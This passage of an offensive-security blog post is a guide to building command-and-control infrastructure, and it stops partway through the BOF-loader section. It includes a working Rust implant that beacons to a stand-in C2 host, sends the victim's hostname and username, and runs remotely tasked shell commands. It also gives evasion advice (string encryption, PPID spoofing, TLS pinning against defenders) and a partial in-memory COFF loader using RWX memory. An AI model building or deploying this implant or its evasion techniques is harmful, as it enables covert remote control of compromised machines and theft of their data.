@@ -1,0 +1,579 @@
+# https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/
+
+<!DOCTYPE html><html lang="en">
+<body>
+
+  <div class="bg-grid"></div>
+
+  
+
+  <main class="scroll">
+    <div class="pg">
+      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="reading-progress" id="reading-progress" aria-hidden="true" style="transform: scaleX(0);"></div>
+
+<article class="article">
+  
+
+  <div class="article-main">
+    
+
+    
+
+    <div class="article-meta">
+      <span>Apr 17, 2026</span>
+      
+        <span class="wu-diff hard">HARD</span>
+      
+      <span>· 10 MIN READ</span>
+    </div>
+
+    <h1 id="top" class="article-title">Building a C2 Stack: Implants, BOF Loaders, Redirectors, and DoH Channels</h1>
+    <p class="article-desc">A practical end-to-end guide to building command-and-control infrastructure - a minimal Rust implant, a COFF-parsing BOF loader, resilient redirector chains, and a DNS-over-HTTPS covert channel. How each layer fits together and where OPSEC attention actually pays off.</p>
+
+    
+    <div class="article-tags">
+      <span class="pill">#c2</span><span class="pill">#rust</span><span class="pill">#bof</span><span class="pill">#coff</span><span class="pill">#redirectors</span><span class="pill">#domain-fronting</span><span class="pill">#doh</span><span class="pill">#opsec</span>
+    </div>
+    
+
+    <div id="toc-inline" class="toc-inline">
+      <div class="toc-label">On this page</div>
+      <ol class="toc-list" id="toc-list-inline"><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#layer-1-the-implant---a-minimal-rust-beacon" data-target="layer-1-the-implant---a-minimal-rust-beacon" class="active">Layer 1: The Implant - A Minimal Rust Beacon</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#why-rust" data-target="why-rust">Why Rust</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#core-loop" data-target="core-loop">Core Loop</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#skeleton" data-target="skeleton">Skeleton</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#jitter-math---why-it-matters" data-target="jitter-math---why-it-matters">Jitter math - why it matters</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#opsec-baseline-for-the-implant" data-target="opsec-baseline-for-the-implant">OPSEC baseline for the implant</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#layer-2-the-bof-loader" data-target="layer-2-the-bof-loader">Layer 2: The BOF Loader</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#why-a-custom-loader" data-target="why-a-custom-loader">Why a Custom Loader</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#coff-format-refresher" data-target="coff-format-refresher">COFF Format Refresher</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#key-structures" data-target="key-structures">Key Structures</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#loader-flow" data-target="loader-flow">Loader Flow</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#beacon-api-dispatch-the-fun-part" data-target="beacon-api-dispatch-the-fun-part">Beacon API Dispatch (the fun part)</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#loading-and-running" data-target="loading-and-running">Loading and Running</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#layer-3-redirector-infrastructure" data-target="layer-3-redirector-infrastructure">Layer 3: Redirector Infrastructure</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#typical-topology" data-target="typical-topology">Typical Topology</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#minimal-nginx-redirector" data-target="minimal-nginx-redirector">Minimal Nginx Redirector</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#domain-fronting-when-cdn-supports-it" data-target="domain-fronting-when-cdn-supports-it">Domain Fronting (when CDN supports it)</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#categorization" data-target="categorization">Categorization</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#opsec-checklist-for-infrastructure" data-target="opsec-checklist-for-infrastructure">OPSEC Checklist for Infrastructure</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#layer-4-dns-over-https-covert-channel" data-target="layer-4-dns-over-https-covert-channel">Layer 4: DNS-over-HTTPS Covert Channel</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#how-the-channel-works" data-target="how-the-channel-works">How the Channel Works</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#why-it-evades-detection" data-target="why-it-evades-detection">Why It Evades Detection</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#minimal-client-python-illustration" data-target="minimal-client-python-illustration">Minimal Client (Python Illustration)</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#authoritative-nameserver-side" data-target="authoritative-nameserver-side">Authoritative Nameserver Side</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#throughput--limits" data-target="throughput--limits">Throughput &amp; Limits</a></li><li class="toc-item toc-h3"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#detection" data-target="detection">Detection</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#how-the-layers-fit" data-target="how-the-layers-fit">How the Layers Fit</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#recommended-reading" data-target="recommended-reading">Recommended Reading</a></li><li class="toc-item toc-h2"><a href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#summary" data-target="summary">Summary</a></li></ol>
+    </div>
+
+    <div class="prose" id="post-content">
+      <p>Rolling your own C2 isn’t about replacing Cobalt Strike. It’s about understanding the pieces deeply enough to modify commercial tools when they get signatured, ship capabilities they don’t have, and debug what’s actually happening on the wire when a beacon stops calling back. This post walks the four layers that together make a working offensive C2 stack: the <strong>implant</strong> (the agent on the target), the <strong>BOF loader</strong> (how you extend the implant without recompiling), <strong>redirector infrastructure</strong> (how you survive being discovered), and a <strong>covert channel</strong> that blends beacon traffic into something the network already trusts.</p>
+
+<h2 id="layer-1-the-implant---a-minimal-rust-beacon">Layer 1: The Implant - A Minimal Rust Beacon<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#layer-1-the-implant---a-minimal-rust-beacon" aria-label="Copy link to Layer 1: The Implant - A Minimal Rust Beacon"><span aria-hidden="true">#</span></a></h2>
+
+<h3 id="why-rust">Why Rust<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#why-rust" aria-label="Copy link to Why Rust"><span aria-hidden="true">#</span></a></h3>
+
+<p>C works. C++ works. But Rust compiles to static native binaries with no runtime, no CLR, no telemetry hooks inherited from a language framework. <code class="language-plaintext highlighter-rouge">cargo build --release</code> produces a 300KB binary with no extra DLL dependencies beyond the Windows imports you explicitly use. Rust’s macros and type system make it easier to layer obfuscation (compile-time string encryption, syscall number patching) cleanly than C.</p>
+
+<h3 id="core-loop">Core Loop<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#core-loop" aria-label="Copy link to Core Loop"><span aria-hidden="true">#</span></a></h3>
+
+<p>The implant is a finite state machine:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>Loop forever:
+  1. sleep(base_interval + jitter_noise)
+  2. POST https://c2/api/beacon → {session_id, host_info}
+  3. Parse response → list of tasks
+  4. For each task: execute, collect output
+  5. POST /api/results → {task_id, output}
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<h3 id="skeleton">Skeleton<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#skeleton" aria-label="Copy link to Skeleton"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="k">use</span> <span class="nn">reqwest</span><span class="p">::</span><span class="nn">blocking</span><span class="p">::</span><span class="n">Client</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">serde</span><span class="p">::{</span><span class="n">Deserialize</span><span class="p">,</span> <span class="n">Serialize</span><span class="p">};</span>
+<span class="k">use</span> <span class="nn">std</span><span class="p">::{</span><span class="n">thread</span><span class="p">,</span> <span class="nn">time</span><span class="p">::</span><span class="n">Duration</span><span class="p">};</span>
+<span class="k">use</span> <span class="nn">rand</span><span class="p">::</span><span class="n">Rng</span><span class="p">;</span>
+
+<span class="k">const</span> <span class="n">BASE_INTERVAL</span><span class="p">:</span> <span class="nb">u64</span> <span class="o">=</span> <span class="mi">30</span><span class="p">;</span>  <span class="c1">// seconds</span>
+<span class="k">const</span> <span class="n">JITTER_PCT</span><span class="p">:</span>    <span class="nb">u64</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
+
+<span class="nd">#[derive(Serialize)]</span>
+<span class="k">struct</span> <span class="n">Checkin</span> <span class="p">{</span> <span class="n">session</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">host</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">user</span><span class="p">:</span> <span class="nb">String</span> <span class="p">}</span>
+
+<span class="nd">#[derive(Deserialize)]</span>
+<span class="k">struct</span> <span class="n">Task</span> <span class="p">{</span> <span class="n">id</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">kind</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span> <span class="n">arg</span><span class="p">:</span> <span class="nb">String</span> <span class="p">}</span>
+
+<span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">client</span> <span class="o">=</span> <span class="nn">Client</span><span class="p">::</span><span class="nf">builder</span><span class="p">()</span>
+        <span class="nf">.user_agent</span><span class="p">(</span><span class="s">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</span><span class="p">)</span>
+        <span class="nf">.build</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
+
+    <span class="k">let</span> <span class="n">session</span> <span class="o">=</span> <span class="nn">uuid</span><span class="p">::</span><span class="nn">Uuid</span><span class="p">::</span><span class="nf">new_v4</span><span class="p">()</span><span class="nf">.to_string</span><span class="p">();</span>
+
+    <span class="k">loop</span> <span class="p">{</span>
+        <span class="c1">// sleep with jitter</span>
+        <span class="k">let</span> <span class="n">jitter</span> <span class="o">=</span> <span class="nn">rand</span><span class="p">::</span><span class="nf">thread_rng</span><span class="p">()</span><span class="nf">.gen_range</span><span class="p">(</span><span class="mi">0</span><span class="o">..=</span><span class="p">(</span><span class="n">BASE_INTERVAL</span> <span class="o">*</span> <span class="n">JITTER_PCT</span> <span class="o">/</span> <span class="mi">100</span><span class="p">));</span>
+        <span class="nn">thread</span><span class="p">::</span><span class="nf">sleep</span><span class="p">(</span><span class="nn">Duration</span><span class="p">::</span><span class="nf">from_secs</span><span class="p">(</span><span class="n">BASE_INTERVAL</span> <span class="o">-</span> <span class="p">(</span><span class="n">BASE_INTERVAL</span> <span class="o">*</span> <span class="n">JITTER_PCT</span> <span class="o">/</span> <span class="mi">200</span><span class="p">)</span> <span class="o">+</span> <span class="n">jitter</span><span class="p">));</span>
+
+        <span class="c1">// check in</span>
+        <span class="k">let</span> <span class="n">resp</span> <span class="o">=</span> <span class="n">client</span><span class="nf">.post</span><span class="p">(</span><span class="s">"https://c2.example.com/api/beacon"</span><span class="p">)</span>
+            <span class="nf">.json</span><span class="p">(</span><span class="o">&amp;</span><span class="n">Checkin</span> <span class="p">{</span>
+                <span class="n">session</span><span class="p">:</span> <span class="n">session</span><span class="nf">.clone</span><span class="p">(),</span>
+                <span class="n">host</span><span class="p">:</span> <span class="nn">hostname</span><span class="p">::</span><span class="nf">get</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">()</span><span class="nf">.to_string_lossy</span><span class="p">()</span><span class="nf">.into</span><span class="p">(),</span>
+                <span class="n">user</span><span class="p">:</span> <span class="nn">whoami</span><span class="p">::</span><span class="nf">username</span><span class="p">(),</span>
+            <span class="p">})</span>
+            <span class="nf">.send</span><span class="p">();</span>
+
+        <span class="k">let</span> <span class="nf">Ok</span><span class="p">(</span><span class="n">r</span><span class="p">)</span> <span class="o">=</span> <span class="n">resp</span> <span class="k">else</span> <span class="p">{</span> <span class="k">continue</span> <span class="p">};</span>
+        <span class="k">let</span> <span class="nf">Ok</span><span class="p">(</span><span class="n">tasks</span><span class="p">):</span> <span class="nb">Result</span><span class="o">&lt;</span><span class="nb">Vec</span><span class="o">&lt;</span><span class="n">Task</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">_</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">r</span><span class="nf">.json</span><span class="p">()</span> <span class="k">else</span> <span class="p">{</span> <span class="k">continue</span> <span class="p">};</span>
+
+        <span class="k">for</span> <span class="n">t</span> <span class="k">in</span> <span class="n">tasks</span> <span class="p">{</span>
+            <span class="k">let</span> <span class="n">output</span> <span class="o">=</span> <span class="k">match</span> <span class="n">t</span><span class="py">.kind</span><span class="nf">.as_str</span><span class="p">()</span> <span class="p">{</span>
+                <span class="s">"shell"</span> <span class="k">=&gt;</span> <span class="nf">execute_shell</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t</span><span class="py">.arg</span><span class="p">),</span>
+                <span class="s">"bof"</span>   <span class="k">=&gt;</span> <span class="nf">execute_bof</span><span class="p">(</span><span class="o">&amp;</span><span class="n">t</span><span class="py">.arg</span><span class="p">),</span>    <span class="c1">// layer 2</span>
+                <span class="s">"exit"</span>  <span class="k">=&gt;</span> <span class="nn">std</span><span class="p">::</span><span class="nn">process</span><span class="p">::</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span>
+                <span class="n">_</span>       <span class="k">=&gt;</span> <span class="s">"unknown task"</span><span class="nf">.into</span><span class="p">(),</span>
+            <span class="p">};</span>
+            <span class="k">let</span> <span class="n">_</span> <span class="o">=</span> <span class="n">client</span><span class="nf">.post</span><span class="p">(</span><span class="s">"https://c2.example.com/api/results"</span><span class="p">)</span>
+                <span class="nf">.json</span><span class="p">(</span><span class="o">&amp;</span><span class="nn">serde_json</span><span class="p">::</span><span class="nd">json!</span><span class="p">({</span><span class="s">"id"</span><span class="p">:</span> <span class="n">t</span><span class="py">.id</span><span class="p">,</span> <span class="s">"output"</span><span class="p">:</span> <span class="n">output</span><span class="p">}))</span>
+                <span class="nf">.send</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">rust</span></pre></div></div>
+
+<h3 id="jitter-math---why-it-matters">Jitter math - why it matters<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#jitter-math---why-it-matters" aria-label="Copy link to Jitter math - why it matters"><span aria-hidden="true">#</span></a></h3>
+
+<p>With 30s base and 20% jitter the actual interval ranges 27s-33s. That breaks periodicity detection - a SOC tool plotting beacon intervals won’t see a perfect line. Go to 50% jitter in hostile environments and beacon slower (300s+) to hide in normal HTTPS request volume.</p>
+
+<h3 id="opsec-baseline-for-the-implant">OPSEC baseline for the implant<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#opsec-baseline-for-the-implant" aria-label="Copy link to OPSEC baseline for the implant"><span aria-hidden="true">#</span></a></h3>
+
+<ul>
+  <li><strong>Strings</strong>: encrypt literals at compile time (<code class="language-plaintext highlighter-rouge">litcrypt</code> / <code class="language-plaintext highlighter-rouge">obfstr</code> crates), decrypt on use.</li>
+  <li><strong>PPID spoof</strong> when spawning commands - child of <code class="language-plaintext highlighter-rouge">explorer.exe</code>, not <code class="language-plaintext highlighter-rouge">beacon.exe</code>.</li>
+  <li><strong>Block child output</strong> by default; fetch only when tasked.</li>
+  <li><strong>Rotate User-Agent</strong> per session.</li>
+  <li><strong>TLS pinning</strong> - embed the certificate hash, fail on mismatch, defeats Burp-style interception by blue team.</li>
+</ul>
+
+<h2 id="layer-2-the-bof-loader">Layer 2: The BOF Loader<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#layer-2-the-bof-loader" aria-label="Copy link to Layer 2: The BOF Loader"><span aria-hidden="true">#</span></a></h2>
+
+<h3 id="why-a-custom-loader">Why a Custom Loader<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#why-a-custom-loader" aria-label="Copy link to Why a Custom Loader"><span aria-hidden="true">#</span></a></h3>
+
+<p>Cobalt Strike ships with a BOF loader. Rolling your own means you can execute the BOF ecosystem from <em>any</em> framework - Sliver, Mythic, Havoc, or a hand-rolled Rust implant. The BOF format is a standard COFF object file; loading it is a bounded engineering task.</p>
+
+<h3 id="coff-format-refresher">COFF Format Refresher<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#coff-format-refresher" aria-label="Copy link to COFF Format Refresher"><span aria-hidden="true">#</span></a></h3>
+
+<p>A compiled <code class="language-plaintext highlighter-rouge">.o</code> file has six components:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code>┌──────────────────────────┐
+│ COFF File Header         │ machine type, section count, symtab offset
+├──────────────────────────┤
+│ Section Headers[]        │ per-section metadata (.text, .rdata, .data, .bss)
+├──────────────────────────┤
+│ Raw section data         │ machine code + constants
+├──────────────────────────┤
+│ Relocations[]            │ per-section: "patch offset X with symbol Y"
+├──────────────────────────┤
+│ Symbol Table             │ function &amp; import names
+├──────────────────────────┤
+│ String Table             │ long symbol names (&gt;8 chars)
+└──────────────────────────┘
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button></pre></div></div>
+
+<h3 id="key-structures">Key Structures<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#key-structures" aria-label="Copy link to Key Structures"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">WORD</span>  <span class="n">Machine</span><span class="p">;</span>              <span class="c1">// 0x8664 for x64</span>
+    <span class="n">WORD</span>  <span class="n">NumberOfSections</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">TimeDateStamp</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">PointerToSymbolTable</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">NumberOfSymbols</span><span class="p">;</span>
+    <span class="n">WORD</span>  <span class="n">SizeOfOptionalHeader</span><span class="p">;</span> <span class="c1">// 0 for object files</span>
+    <span class="n">WORD</span>  <span class="n">Characteristics</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">COFF_HEADER</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">BYTE</span>  <span class="n">Name</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+    <span class="n">DWORD</span> <span class="n">VirtualSize</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">VirtualAddress</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">SizeOfRawData</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">PointerToRawData</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">PointerToRelocations</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">PointerToLinenumbers</span><span class="p">;</span>
+    <span class="n">WORD</span>  <span class="n">NumberOfRelocations</span><span class="p">;</span>
+    <span class="n">WORD</span>  <span class="n">NumberOfLinenumbers</span><span class="p">;</span>
+    <span class="n">DWORD</span> <span class="n">Characteristics</span><span class="p">;</span>
+<span class="p">}</span> <span class="n">SECTION_HEADER</span><span class="p">;</span>
+
+<span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+    <span class="n">DWORD</span> <span class="n">VirtualAddress</span><span class="p">;</span>   <span class="c1">// where in the section to patch</span>
+    <span class="n">DWORD</span> <span class="n">SymbolTableIndex</span><span class="p">;</span> <span class="c1">// which symbol provides the value</span>
+    <span class="n">WORD</span>  <span class="n">Type</span><span class="p">;</span>             <span class="c1">// how to compute the patch (rel32, addr64, etc.)</span>
+<span class="p">}</span> <span class="n">RELOCATION</span><span class="p">;</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<h3 id="loader-flow">Loader Flow<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#loader-flow" aria-label="Copy link to Loader Flow"><span aria-hidden="true">#</span></a></h3>
+
+<ol>
+  <li><strong>Read the BOF file</strong> into memory.</li>
+  <li><strong>Allocate</strong> one <code class="language-plaintext highlighter-rouge">VirtualAlloc</code>‘d RWX region per section, copy raw bytes.</li>
+  <li><strong>Walk symbols</strong>. For each imported symbol:
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">__imp_Beacon*</code> → your own dispatch function (<code class="language-plaintext highlighter-rouge">BeaconPrintf</code>, <code class="language-plaintext highlighter-rouge">BeaconDataParse</code>, etc.)</li>
+      <li><code class="language-plaintext highlighter-rouge">__imp_&lt;MODULE&gt;$&lt;function&gt;</code> → <code class="language-plaintext highlighter-rouge">GetProcAddress(LoadLibraryA("&lt;MODULE&gt;.dll"), "&lt;function&gt;")</code></li>
+      <li>Store resolved address in a side table indexed by symbol number.</li>
+    </ul>
+  </li>
+  <li><strong>Apply relocations</strong>. For each relocation:
+    <ul>
+      <li>Compute the patch value using the symbol table.</li>
+      <li>Patch based on <code class="language-plaintext highlighter-rouge">Type</code>:
+        <ul>
+          <li><code class="language-plaintext highlighter-rouge">IMAGE_REL_AMD64_ADDR64</code> (0x01) → write full 64-bit absolute address.</li>
+          <li><code class="language-plaintext highlighter-rouge">IMAGE_REL_AMD64_REL32</code>  (0x04) → write 32-bit displacement from patch site + 4.</li>
+          <li><code class="language-plaintext highlighter-rouge">IMAGE_REL_AMD64_ADDR32NB</code> (0x03) → write RVA.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><strong>Find the <code class="language-plaintext highlighter-rouge">go</code> symbol</strong>, cast to <code class="language-plaintext highlighter-rouge">void (*)(char*, int)</code>, call with task arguments.</li>
+  <li><strong>Free</strong> allocations after <code class="language-plaintext highlighter-rouge">go</code> returns.</li>
+</ol>
+
+<h3 id="beacon-api-dispatch-the-fun-part">Beacon API Dispatch (the fun part)<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#beacon-api-dispatch-the-fun-part" aria-label="Copy link to Beacon API Dispatch (the fun part)"><span aria-hidden="true">#</span></a></h3>
+
+<p>The BOF calls <code class="language-plaintext highlighter-rouge">BeaconPrintf(CALLBACK_OUTPUT, "fmt", args...)</code>. Your loader implements it:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="kt">void</span> <span class="nf">BeaconPrintf</span><span class="p">(</span><span class="kt">int</span> <span class="n">type</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span><span class="o">*</span> <span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
+    <span class="kt">va_list</span> <span class="n">ap</span><span class="p">;</span> <span class="n">va_start</span><span class="p">(</span><span class="n">ap</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
+    <span class="n">vsnprintf_s</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">_TRUNCATE</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">ap</span><span class="p">);</span>
+    <span class="n">va_end</span><span class="p">(</span><span class="n">ap</span><span class="p">);</span>
+    <span class="n">your_c2_send_result</span><span class="p">(</span><span class="n">type</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>  <span class="c1">// ship it to teamserver</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>And <code class="language-plaintext highlighter-rouge">BeaconDataParse</code> + friends do the inverse: unpack the binary task argument into typed fields.</p>
+
+<h3 id="loading-and-running">Loading and Running<a class="anchor-link" href="https://robinx0.github.io/blogs/c2-development/c2-stack-build-guide/#loading-and-running" aria-label="Copy link to Loading and Running"><span aria-hidden="true">#</span></a></h3>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight" style="position: relative;"><code><span class="kt">void</span> <span class="nf">run_bof</span><span class="p">(</span><span class="n">BYTE</span><span class="o">*</span> <span class="n">file</span><span class="p">,</span> <span class="n">SIZE_T</span> <span class="n">fileSize</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">args</span><span class="p">,</span> <span class="kt">int</span> <span class="n">argLen</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">COFF_HEADER</span><span class="o">*</span> <span class="n">hdr</span> <span class="o">=</span> <span class="p">(</span><span class="n">COFF_HEADER</span><span class="o">*</span><span class="p">)</span><span class="n">file</span><span class="p">;</span>
+    <span class="n">SECTION_HEADER</span><span class="o">*</span> <span class="n">sects</span> <span class="o">=</span> <span class="p">(</span><span class="n">SECTION_HEADER</span><span class="o">*</span><span class="p">)(</span><span class="n">file</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="n">hdr</span><span class="p">));</span>
+
+    <span class="c1">// Allocate + copy sections</span>
+    <span class="n">PVOID</span><span class="o">*</span> <span class="n">sect_mem</span> <span class="o">=</span> <span class="n">calloc</span><span class="p">(</span><span class="n">hdr</span><span class="o">-&gt;</span><span class="n">NumberOfSections</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">));</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">hdr</span><span class="o">-&gt;</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">sect_mem</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">sects</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">SizeOfRawData</span><span class="p">,</span>
+            <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">sects</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">PointerToRawData</span><span class="p">)</span>
+            <span class="n">memcpy</span><span class="p">(</span><span class="n">sect_mem</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">file</span> <span class="o">+</span> <span class="n">sects</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">PointerToRawData</span><span class="p">,</span> <span class="n">sects</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">SizeOfRawData</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="c1">// Resolve imports, apply relocations, find `go`, call it...</span>
+    <span class="c1">// (omitted for length - the full loader is ~300 lines of C)</span>
+
+    <span class="c1">// Cleanup</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">hdr</span><span class="o">-&gt;</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+        <span class="n">VirtualFree</span><span class="p">(</span><span class="n">sect_mem</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>
+    <span class="n">free</span><span class="p">(</span><span class="n">sect_mem</span><span class="p">);</span>
+<span class="p">}</span>
+</code><button type="button" class="copy-btn" aria-label="Copy code to clipboard">Copy</button><span class="code-lang">c</span></pre></div></div>
+
+<p>Full working implementations worth studying:</p>
+<ul>
